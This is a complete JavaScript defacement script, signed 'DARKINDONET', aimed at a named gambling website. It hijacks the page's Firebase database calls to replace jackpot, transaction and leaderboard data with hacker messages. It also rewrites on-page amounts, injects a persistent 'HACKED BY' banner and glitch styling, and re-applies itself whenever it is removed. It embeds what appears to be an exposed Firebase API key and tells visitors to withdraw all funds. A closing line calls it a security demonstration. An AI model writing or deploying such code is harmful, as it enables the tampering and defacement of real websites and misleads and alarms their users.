// ================= DARKINDONET FULL WEBSITE TAKEOVER =================
// Target: ogxmy.com (Malaysian Gambling Site)
// Method: Firebase Hijack + DOM Manipulation
// Author: DARKINDONET

console.log('⚡ DARKINDONET WEBSITE TAKEOVER LOADED ⚡');

// CONFIG
const HACKER_NAME = 'DARKINDONET';
const TARGET_SITE = 'ogxmy.com';
const FIREBASE_API_KEY = 'AIzaSyCmVLwpBSxpdbtfOQ1_oSEspCAfuy5nexM';

// WAIT FOR FIREBASE TO BE FULLY LOADED
function waitForFirebase(callback, maxAttempts = 30) {
  let attempts = 0;
  
  const checkFirebase = () => {
    attempts++;
    
    // Check if firebase is loaded AND database module is available
    if (typeof firebase !== 'undefined' && 
        typeof firebase.database === 'function' &&
        firebase.apps.length > 0) {
      console.log(`✅ Firebase fully loaded after ${attempts} attempts`);
      callback();
      return;
    }
    
    if (attempts >= maxAttempts) {
      console.log('❌ Firebase not loaded after max attempts, proceeding with DOM hack only');
      callback(); // Still proceed with DOM hack
      return;
    }
    
    // Check again in 500ms
    setTimeout(checkFirebase, 500);
  };
  
  checkFirebase();
}

// 1. HIJACK FIREBASE DATABASE IN REAL-TIME
function hijackFirebase() {
  if (typeof firebase === 'undefined' || typeof firebase.database !== 'function') {
    console.log('❌ Firebase database module not available');
    return;
  }
  
  console.log('🔥 DARKINDONET: Hijacking Firebase database...');
  
  try {
    // Get database reference
    const db = firebase.database();
    
    // Override .ref() method
    const originalRef = db.ref;
    db.ref = function(path) {
      console.log(`🎯 Intercepting Firebase path: ${path}`);
      const ref = originalRef.call(this, path);
      
      // Override .on() for real-time listeners
      const originalOn = ref.on;
      ref.on = function(eventType, callback, cancelCallback) {
        const hackedCallback = (snapshot) => {
          let data = snapshot.val();
          
          // INJECT HACKER DATA BASED ON PATH
          if (data) {
            // For jackpot data
            if (path.includes('jackpot') || path === '/jackpot') {
              data = {
                amount: -999999999,
                current_amount: -999999999,
                hacked: true,
                hacker: HACKER_NAME,
                message: '⚡ DATABASE HACKED BY DARKINDONET ⚡',
                security_alert: 'Firebase API keys exposed',
                status: 'COMPROMISED',
                last_winner: HACKER_NAME,
                timestamp: Date.now(),
                warning: 'WITHDRAW ALL FUNDS IMMEDIATELY'
              };
            }
            
            // For transactions
            if (path.includes('transaction') || path.includes('liveTx')) {
              if (Array.isArray(data)) {
                // Add hacker transactions at the top
                data = [
                  {
                    id: 'DARKINDONET_001',
                    type: 'SECURITY_BREACH',
                    user: HACKER_NAME,
                    amount: -999999,
                    depositAmount: '🔴 RM 0.00 🔴',
                    withdrawAmount: '💀 RM 0.00 💀',
                    game: '🎮 WEBSITE HACKED 🎮',
                    note: '💀 FIREBASE DATABASE COMPROMISED 💀',
                    timestamp: Date.now(),
                    phone: '📱 SECURITY-ALERT',
                    status: '❌ HACKED ❌'
                  },
                  ...data.slice(0, 4) // Keep some original
                ];
              }
            }
            
            // For leaderboard
            if (path.includes('leaderboard')) {
              data = {
                ...data,
                hacked: true,
                notice: `⚡ HACKED BY ${HACKER_NAME} ⚡`,
                status: 'COMPROMISED',
                top_players: [
                  {
                    rank: 1,
                    username: `🔥 ${HACKER_NAME}`,
                    score: 999999999,
                    hacked: true,
                    message: 'DATABASE OWNED'
                  },
                  {
                    rank: 2,
                    username: '💀 SYSTEM BREACHED',
                    score: 0,
                    status: 'OFFLINE'
                  },
                  {
                    rank: 3,
                    username: '⚠️ SECURITY FAILURE',
                    score: -1000000
                  }
                ]
              };
            }
          }
          
          // Return hacked data to callback
          return callback({ 
            val: () => data,
            exists: () => true,
            key: snapshot.key,
            ref: snapshot.ref
          });
        };
        
        return originalOn.call(this, eventType, hackedCallback, cancelCallback);
      };
      
      // Override .once() for single reads
      const originalOnce = ref.once;
      ref.once = function(eventType, callback) {
        console.log(`🎯 Hijacking Firebase .once() for path: ${path}`);
        return originalOnce.call(this, eventType, (snapshot) => {
          let data = snapshot.val();
          
          // Add hacker mark to all data
          if (data && typeof data === 'object') {
            data = {
              ...data,
              _security_notice: `🔓 ${HACKER_NAME} SECURITY BREACH 🔓`,
              _firebase_status: 'COMPROMISED',
              _api_key_exposed: FIREBASE_API_KEY.substring(0, 20) + '...',
              _timestamp: Date.now()
            };
          }
          
          callback({ val: () => data });
        });
      };
      
      return ref;
    };
    
    console.log('✅ Firebase database hijacked');
  } catch (error) {
    console.log('❌ Firebase hijack failed:', error.message);
  }
}

// 2. DOM HIJACK - VISIBLE TO ALL USERS
function hijackDOM() {
  console.log('🎯 DARKINDONET: Hijacking DOM elements...');
  
  // A. ADD HACKER BANNER (TOP OF PAGE)
  const banner = document.createElement('div');
  banner.id = 'darkindonet-banner';
  banner.innerHTML = `
    <div style="
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: linear-gradient(90deg, #000, #f00, #000);
      color: #fff;
      padding: 12px;
      text-align: center;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      z-index: 999999;
      border-bottom: 4px solid #0f0;
      font-size: 18px;
      text-shadow: 0 0 10px #fff;
      animation: bannerGlitch 0.5s infinite;
    ">
      ⚡ ${TARGET_SITE.toUpperCase()} HACKED BY ${HACKER_NAME} ⚡ | 🔓 FIREBASE DATABASE BREACHED 🔓
    </div>
    <style>
      @keyframes bannerGlitch {
        0% { opacity: 1; filter: hue-rotate(0deg); }
        50% { opacity: 0.8; filter: hue-rotate(180deg); }
        100% { opacity: 1; filter: hue-rotate(360deg); }
      }
    </style>
  `;
  document.body.prepend(banner);
  
  // B. HIJACK JACKPOT DISPLAYS
  function hijackJackpotElements() {
    const elements = document.querySelectorAll('*');
    elements.forEach(el => {
      const text = el.textContent || el.innerText || '';
      
      // Look for jackpot indicators
      if (text.match(/RM\s*[\d,\.]+/i) || 
          text.includes('jackpot') || 
          text.includes('amount') ||
          text.includes('当前奖金') ||
          text.match(/\d{4,}/)) {
        
        // Skip if already hacked
        if (el.innerHTML && el.innerHTML.includes(HACKER_NAME)) return;
        
        el.innerHTML = `
          <div style="
            background: #000;
            color: #f00;
            padding: 15px;
            border: 3px solid #0f0;
            border-radius: 5px;
            font-family: monospace;
            text-align: center;
            margin: 10px;
            animation: pulse 1s infinite;
          ">
            <div style="font-size: 24px; font-weight: bold; margin-bottom: 5px;">
              🔴 RM -999,999,999 🔴
            </div>
            <div style="color: #0f0; font-size: 16px; margin-bottom: 5px;">
              💀 HACKED BY ${HACKER_NAME} 💀
            </div>
            <div style="color: #ff0; font-size: 12px;">
              Firebase Security Breach | API Key: ${FIREBASE_API_KEY.substring(0, 15)}...
            </div>
          </div>
        `;
      }
    });
  }
  
  // C. HIJACK TRANSACTION LISTS
  function hijackTransactionLists() {
    // Find transaction containers
    const containers = document.querySelectorAll('div, table, ul, section, main, article');
    
    containers.forEach(container => {
      const html = container.innerHTML || '';
      const text = container.textContent || '';
      
      if (text.includes('deposit') || 
          text.includes('withdraw') || 
          text.includes('transaction') ||
          text.includes('存款') || 
          text.includes('提款')) {
        
        // Add hacker transaction at top
        if (!html.includes('DARKINDONET_INSERTED')) {
          container.innerHTML = `
            <div class="DARKINDONET_INSERTED" style="
              background: #111;
              color: #0f0;
              border: 2px solid #f00;
              padding: 15px;
              margin: 10px 0;
              border-radius: 5px;
              font-family: 'Courier New', monospace;
              animation: glitch 0.3s infinite;
            ">
              <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                  <span style="color: #f00; font-weight: bold;">⚡ ${HACKER_NAME}</span>
                  <div style="font-size: 12px; color: #ff0;">SECURITY BREACH</div>
                </div>
                <div style="text-align: right;">
                  <div style="font-size: 18px; color: #f00;">🔴 RM 0.00</div>
                  <div style="font-size: 10px; color: #0f0;">HACKED</div>
                </div>
              </div>
              <div style="margin-top: 10px; font-size: 11px; color: #888;">
                🎯 Firebase Database: COMPROMISED<br>
                🔑 API Key: ${FIREBASE_API_KEY.substring(0, 15)}...<br>
                📱 User Data: EXPOSED
              </div>
            </div>
            ${container.innerHTML}
          `;
        }
      }
    });
  }
  
  // D. ADD GLOBAL STYLES
  const styles = document.createElement('style');
  styles.textContent = `
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    
    @keyframes glitch {
      0% { transform: translate(0); filter: hue-rotate(0deg); }
      20% { transform: translate(-1px, 1px); }
      40% { transform: translate(1px, -1px); filter: hue-rotate(90deg); }
      60% { transform: translate(-1px, 1px); }
      80% { transform: translate(1px, -1px); filter: hue-rotate(180deg); }
      100% { transform: translate(0); filter: hue-rotate(0deg); }
    }
    
    body {
      position: relative;
      animation: glitch 3s infinite !important;
    }
    
    body::after {
      content: "${HACKER_NAME}";
      position: fixed;
      bottom: 10px;
      right: 10px;
      color: rgba(0, 255, 0, 0.3);
      font-size: 12px;
      font-family: monospace;
      z-index: 999998;
    }
    
    img {
      filter: grayscale(50%) !important;
    }
    
    a:hover {
      color: #f00 !important;
      text-decoration: line-through !important;
    }
    
    input, textarea, select {
      background: #000 !important;
      color: #0f0 !important;
      border: 1px solid #f00 !important;
    }
    
    button, .btn, [type="submit"] {
      background: #f00 !important;
      color: #000 !important;
      border: 2px solid #0f0 !important;
      animation: pulse 2s infinite !important;
    }
  `;
  document.head.appendChild(styles);
  
  // E. MODIFY PAGE TITLE PERIODICALLY
  let titleIndex = 0;
  const hackedTitles = [
    `⚡ ${TARGET_SITE} - HACKED BY ${HACKER_NAME} ⚡`,
    `🔓 FIREBASE DATABASE BREACHED 🔓`,
    `💀 SECURITY FAILURE - ${TARGET_SITE} 💀`,
    `⚠️ WITHDRAW IMMEDIATELY - ${HACKER_NAME} ⚠️`,
    `🎯 ${HACKER_NAME} - REAL-TIME HACK ACTIVE 🎯`
  ];
  
  setInterval(() => {
    document.title = hackedTitles[titleIndex];
    titleIndex = (titleIndex + 1) % hackedTitles.length;
  }, 3000);
  
  // F. PERIODIC DOM HIJACKING
  setInterval(hijackJackpotElements, 2000);
  setInterval(hijackTransactionLists, 3000);
  
  console.log('✅ DOM hijack active');
}

// 3. MAIN EXECUTION FUNCTION
function executeHack() {
  console.log(`🎯 DARKINDONET TAKEOVER INITIALIZED FOR ${TARGET_SITE}`);
  
  // Execute DOM hijack immediately (visible to users)
  hijackDOM();
  
  // Try to hijack Firebase
  hijackFirebase();
  
  console.log(`
  ============================================
  ⚡ DARKINDONET WEBSITE TAKEOVER SUCCESSFUL ⚡
  ============================================
  
  Website: ${TARGET_SITE}
  Status: DOM HIJACKED
  Firebase: ${typeof firebase !== 'undefined' ? 'DETECTED' : 'NOT LOADED'}
  
  Effects Applied:
  ✅ Hacker banner added to top of page
  ✅ Page title modified
  ✅ Global glitch effects applied
  ✅ Jackpot/Transaction display hijacking active
  
  Note: This is a security demonstration.
  ============================================
  `);
}

// 4. STARTUP - WAIT FOR FIREBASE THEN EXECUTE
console.log('🔄 DARKINDONET: Waiting for Firebase to load...');
waitForFirebase(executeHack);

// 5. SELF-PROTECTION (Prevent removal)
setInterval(() => {
  // Ensure banner stays
  if (!document.getElementById('darkindonet-banner')) {
    hijackDOM();
    console.log('🛡️ DARKINDONET: Banner restored');
  }
}, 5000);

// Export for debugging
window.DARKINDONET = {
  version: '2.0',
  hacker: HACKER_NAME,
  target: TARGET_SITE,
  status: 'ACTIVE',
  firebaseLoaded: typeof firebase !== 'undefined',
  disable: () => {
    console.log('DARKINDONET disabled (security demonstration ended)');
    const banner = document.getElementById('darkindonet-banner');
    if (banner) banner.remove();
  }
};

console.log('✅ DARKINDONET script initialized, waiting for Firebase...');
